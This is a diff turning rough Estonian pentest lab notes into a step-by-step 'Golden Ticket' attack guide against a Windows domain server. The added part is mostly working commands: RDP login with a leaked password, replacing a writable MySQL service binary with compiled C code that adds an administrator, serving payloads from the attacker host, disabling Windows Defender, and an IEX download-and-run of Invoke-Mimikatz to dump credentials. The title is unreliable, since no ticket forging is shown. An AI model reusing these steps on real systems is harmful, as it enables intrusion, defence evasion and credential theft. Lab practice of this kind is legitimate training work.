@@ -1,109 +1,175 @@
-Kuldne Pilet
+# Golden Ticket Rünnakujuhend
 
-ltm hashist saab hiljem Kerberose võtme
+See dokument kirjeldab "Golden Ticket" tüüpi rünnaku stsenaariumit, mis kasutab ära valesti konfigureeritud teenuse õigusi, et saavutada süsteemis kõrgemad privileegid.
 
-*************************************************
+## Eeltingimused ja Keskkond
 
-PENTEST
-VmWare keskkonnas kõik meie oma siseses VLANis
-*************************************************
+-   **Ründaja masin (Kali):** `192.168.1.101`
+-   **Domeenikontroller (DC01):** `192.168.1.2` (Domeen: `contoso.com`)
+-   **Sihtmärkserver (server1):** `192.168.1.17`
+-   **Kompromiteeritud kasutaja:**
+    -   Kasutajanimi: `henry`
+    -   Parool: `V4hetaM1nd.`
 
-Masinad:
-dc01 - peab kõike enne sisse lülitama
-srv1
-w11
+---
 
-*************************************************
-Alustame Kali masinas
+## Rünnaku Sammud
 
-veendume oma IP, et oleme ikka samas võrgus nagu eelpool olevad seadmed, mille vastu hakkame rünnakut tegema
+### 1. Võrgu skaneerimine ja sihtmärgi tuvastamine
+
+Alustame Kali masinas võrgu skaneerimisega, et tuvastada aktiivsed seadmed ja nende teenused.
+
+```bash
+# Veendu, et oled õiges võrgus
 ip a
 
-sudo nmap -sV -0 192.168.1.0.24
+# Skaneeri /24 võrku, et leida seadmeid, nende operatsioonisüsteeme (-O) ja teenuste versioone (-sV)
+sudo nmap -sV -O 192.168.1.0/24
+```
 
-192.168.1.2
-workgroup: CONTOSO
-Domain: contoso.com
-Host: DC01
-MAC Address: 00:50:56:B8:2D:A1
-port 
+**Tulemused:**
+*   `192.168.1.2`: Tuvastatud kui `DC01` domeenis `contoso.com`.
+*   `192.168.1.17`: Tuvastatud avatud pordiga `3389/tcp` (RDP).
 
-192.168.1.17
-MAC Address: 00:50:56:B8:01:B7
-port 3389 ehk rdp
+### 2. Sisselogimine kompromiteeritud kontoga
 
-saime teada DC01 masina nime ja tema ip, gruppi ja domeeni nime, ka MAC aadressid
-sammuti ka serveri ip, kuid tema host nime ei saanud teada, kuid tal on lahti port 3389 ehk rdp
-************************************************
-W11 
-k: Henry
-p: V4hetaM1nd.
+Kasutame lekkinud `henry` kontot, et ühenduda sihtmärkserveriga (`192.168.1.17`) RDP kaudu.
 
-terminalis kontrollime:
-whoami  (kes ma olen)
-whoami /groups (kes ma olen ja mis grupid mul küljes on)
-*************************************************
-KALIS:
-
+```bash
 sudo xfreerdp3 /u:henry /p:'V4hetaM1nd.' /d:contoso /v:192.168.1.17
-Y
-ja avaneb uus aken ning logib Serverisse
+```
 
-avanenud serveris avame terminali ja kontrollime:
+Pärast ühendumist ava serveris PowerShell ja kontrolli kasutaja õigusi.
 
+```powershell
 whoami /groups
-hostname
+```
 
-remote desktopiga võib igaks juhuks kontrollida,kas tavakasutaja õigustega saab domeenikontrollerile ligi
+### 3. Teenuste uurimine
 
-Powershellis:
-Get-CimInstance -ClassName Win32_service | Select Name,State,PathName,StartName | Where-Object State -like 'Running'
+Otsime sihtmärkserveris jooksvaid teenuseid, et leida potentsiaalseid rünnak vektoreid.
 
-Nägime, et seal on MYSQL salvestame kogu tee koos selle exe faili nimega
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object State -like "Running"
+```
 
-sisestame 
-icals 'C:\xampp\mysql\bin\mysqld.exe'
+Märkame jooksvat `MySQL` teenust. Kontrollime selle käivitatava faili (`mysqld.exe`) õigusi.
 
-Näeme et Full access
+```powershell
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+```
 
-Get-CimInstance -ClassName Win32_service -Filter "Name='mysql'" | Select-Object StartMode
+**Tulemus:**
+*   `BUILTIN\Users:(F)` - See tähendab, et kõik kasutajad (sh meie `henry` kasutaja) omavad sellele failile täielikke (Full access) õigusi.
 
-Näeme, et Auto
+Kontrollime ka, kas teenus käivitub automaatselt.
 
+```powershell
+Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object Startmode
+```
 
-*************************************************
-Avame Kalis uue terminali
+**Tulemus:**
+*   `Startmode: Auto` - See on ideaalne, kuna see tähendab, et meie pahatahtlik kood käivitatakse automaatselt pärast süsteemi taaskäivitamist.
 
-kontrollime kus oleme - ls
+### 4. Pahavara loomine (Admin-kasutaja lisamine)
 
-teeme uue kausta mkdir pentest ja siis siseneme temasse
+Loome Kali masinas C-keeles lihtsa programmi, mis lisab süsteemi uue lokaalse administraatori nimega `pentest` ja parooliga `kalasaba1.`.
+
+```bash
+# Loo uus kaust ja sisene sinna
+mkdir pentest
 cd pentest
 
-loome uue faili nano adduser.c
+# Loo C-fail
+nano adduser.c
+```
 
-siis teeme sellele ka .exe ja kõige lõpuks teeme sellest kaustast http veebiserveri
+Kopeeri faili `adduser.c` järgnev sisu:
+```c
+#include <stdlib.h>
+
+int main() {
+    // Lisa uus kasutaja "pentest" parooliga "kalasaba1."
+    system("net user pentest kalasaba1. /add");
+    // Lisa loodud kasutaja lokaalsete administraatorite gruppi
+    system("net localgroup administrators pentest /add");
+    return 0;
+}
+```
+
+Kompileerime C-koodi Windowsi `.exe` failiks.
+
+```bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+### 5. Pahavara serveerimine ja allalaadimine
+
+Käivitame `pentest` kaustas Pythoni veebiserveri, et saaksime `adduser.exe` faili sihtmärkserverisse laadida.
+
+```bash
+# Käivita veebiserver pordil 80
 python3 -m http.server 80
+```
 
-siis lähme tagasi RDP powershell aknasse
+Nüüd lae sihtmärkserveri (RDP sessiooni) PowerShellis fail alla:
 
-iwr -Uri http:\\192.168.1.101\adduser.exe -OutFile adduser.exe
+```powershell
+# Lae fail alla Kali masinast (192.168.1.101)
+iwr -Uri http://192.168.1.101/adduser.exe -OutFile adduser.exe
+```
 
-masinas saab sees kontrollida User kasutaja kaustas kas fail tekkis ja teises terminali on ka näha, et http server adduser.exe on ühendatud
+### 6. Teenuse faili asendamine
 
-PShell teeme algsest mysql failist backupi
-move C:\\xampp\mysql\bin\mysqld.exe oldmysqld.exe
+Sihtmärkserveri PowerShellis asendame nüüd originaalse `mysqld.exe` faili meie loodud `adduser.exe`-ga.
 
-ja asendame ta
+```powershell
+# Tee originaalfailist varukoopia
+move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\oldmysqld.exe
 
+# Asenda originaal meie failiga
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+```
 
-restart-computer ning liigume tagasi sinna aknasse, kus meil oli xfreerdp3 muudame seal kasutaja ja parooli nii nagu nano failis sisestasime ja eemaldame domeeni
-sudo xfreerdp3 /u:pentest /p:'kalasaba1.' /v:192.168.1.17 
-ja voilaa saamegi ADserverisse sisse oma kasutaja ja parooliga
+Nüüd teeme serverile restardi. Pärast restarti käivitab MySQL teenus meie `adduser.exe` faili ja loob uue admin-kasutaja.
 
-Kali browseris:
-https://github.com/leppalintu/invoke_mimikaz
+```powershell
+Restart-Computer
+```
 
-laeme alla mõlemad, nii ps1 ja exe failid j tõstame nad oma pentest katalogi, mis on meie veebiserver
+### 7. Sisselogimine uue admin-kontoga
 
+Pärast serveri taaskäivitumist saame sisse logida uue, äsja loodud `pentest` kontoga. See konto on lokaalne, seega domeeni (`/d:contoso`) pole vaja määrata.
 
+```bash
+sudo xfreerdp3 /u:pentest /p:'kalasaba1.' /v:192.168.1.17
+```
 
+**Õnnitleme! Oled nüüd serveris lokaalse administraatori õigustes.**
+
+### 8. Järeltegevus: Mimikatz
+
+Administraatori õigustes saame proovida mälust paroole ja räsisid kätte saada, kasutades **Mimikatz**.
+
+Esmalt, lae Mimikatz alla. Selleks võib kasutada näiteks [Invoke-Mimikatz](https://github.com/leppalintu/invoke_mimikaz) repositooriumit. Lae failid oma Kali masina `pentest` kausta, kus jookseb veebiserver.
+
+Seejärel, sihtmärkserveri uues admin-sessioonis (juba `pentest` kasutajana), keela ajutiselt Windows Defender.
+
+```powershell
+# Keela reaalajas monitooring (nõuab admin õigusi)
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Lae Mimikatz alla ja käivita see mälus, et vältida kettale kirjutamist.
+
+```powershell
+# Lae ja käivita Invoke-Mimikatz skript
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.101/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds
+```
+Alternatiivselt, kui laadisid alla `.exe` faili, saad selle käivitada. Enne seda tõsta oma protsessi õigusi:
+
+```powershell
+privilege::debug
+```
+See annab vajalikud õigused, et teiste protsesside mälu lugeda.
